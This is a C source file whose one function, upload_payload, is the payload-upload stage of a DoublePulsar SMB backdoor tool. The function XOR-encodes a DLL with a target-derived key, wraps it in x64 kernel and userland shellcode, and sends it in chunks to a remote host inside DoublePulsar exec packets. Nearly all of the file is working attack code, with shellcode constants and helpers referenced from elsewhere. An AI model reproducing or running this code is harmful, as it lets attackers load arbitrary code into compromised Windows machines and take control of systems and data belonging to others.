#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <poll.h>
#include <pthread.h>
#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <grp.h>
#include <utime.h>
#include <syslog.h>
#include <wchar.h>
#include "config.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>

extern unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port);
extern void xor_buffer(unsigned char *data, size_t len, unsigned int key);
extern int smb_send(int sock, const unsigned char *data, size_t len);

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    FILE *file = NULL;
    unsigned char *dll = NULL;
    unsigned char *payload = NULL;
    unsigned char *packet = NULL;
    struct addrinfo hints;
    struct addrinfo *addresses = NULL;
    struct addrinfo *address;
    size_t dll_len;
    size_t part1_len = sizeof(KERNEL_SHELLCODE_X64_PART1);
    size_t part2_len = sizeof(KERNEL_SHELLCODE_X64_PART2);
    size_t userland_len = sizeof(USERLAND_SHELLCODE_X64);
    size_t template_len = sizeof(DP_EXEC_PKT);
    size_t payload_len;
    size_t offset;
    size_t packet_capacity;
    long file_size;
    uint32_t process_hash;
    unsigned int xor_key;
    int sock = -1;
    int gai_result;
    int result = -1;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535)
        return -1;

    file = fopen(payload_path, "rb");
    if (file == NULL)
        goto cleanup;

    if (fseek(file, 0, SEEK_END) != 0)
        goto cleanup;
    file_size = ftell(file);
    if (file_size <= 0)
        goto cleanup;
    if (fseek(file, 0, SEEK_SET) != 0)
        goto cleanup;

    dll_len = (size_t)file_size;
    dll = malloc(dll_len);
    if (dll == NULL)
        goto cleanup;
    if (fread(dll, 1, dll_len, file) != dll_len)
        goto cleanup;
    if (fclose(file) != 0) {
        file = NULL;
        goto cleanup;
    }
    file = NULL;

    xor_key = DoublePulsarXORKeyCalculator(ip, port);
    xor_buffer(dll, dll_len, xor_key);

    payload_len = part1_len + sizeof(process_hash) + part2_len + userland_len + dll_len;
    payload = malloc(payload_len);
    if (payload == NULL)
        goto cleanup;

    offset = 0;
    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART1, part1_len);
    offset += part1_len;

    process_hash = (uint32_t)payload_type;
    payload[offset++] = (unsigned char)(process_hash & 0xffU);
    payload[offset++] = (unsigned char)((process_hash >> 8) & 0xffU);
    payload[offset++] = (unsigned char)((process_hash >> 16) & 0xffU);
    payload[offset++] = (unsigned char)((process_hash >> 24) & 0xffU);

    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART2, part2_len);
    offset += part2_len;
    memcpy(payload + offset, USERLAND_SHELLCODE_X64, userland_len);
    offset += userland_len;
    memcpy(payload + offset, dll, dll_len);

    if (SMB_CHUNK_SIZE <= 0)
        goto cleanup;
    packet_capacity = template_len + (size_t)SMB_CHUNK_SIZE;
    packet = malloc(packet_capacity);
    if (packet == NULL)
        goto cleanup;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    {
        char service[16];
        snprintf(service, sizeof(service), "%d", port);
        gai_result = getaddrinfo(ip, service, &hints, &addresses);
    }
    if (gai_result != 0)
        goto cleanup;

    for (address = addresses; address != NULL; address = address->ai_next) {
        sock = socket(address->ai_family, address->ai_socktype, address->ai_protocol);
        if (sock < 0)
            continue;
        if (connect(sock, address->ai_addr, address->ai_addrlen) == 0)
            break;
        close(sock);
        sock = -1;
    }
    if (sock < 0)
        goto cleanup;

    for (offset = 0; offset < payload_len;) {
        size_t chunk_len = payload_len - offset;
        if (chunk_len > (size_t)SMB_CHUNK_SIZE)
            chunk_len = (size_t)SMB_CHUNK_SIZE;

        memcpy(packet, DP_EXEC_PKT, template_len);
        memcpy(packet + template_len, payload + offset, chunk_len);
        if (smb_send(sock, packet, template_len + chunk_len) < 0)
            goto cleanup;

        offset += chunk_len;
    }

    result = 0;

cleanup:
    if (sock >= 0)
        close(sock);
    if (addresses != NULL)
        freeaddrinfo(addresses);
    if (file != NULL)
        fclose(file);
    free(packet);
    free(payload);
    free(dll);
    return result;
}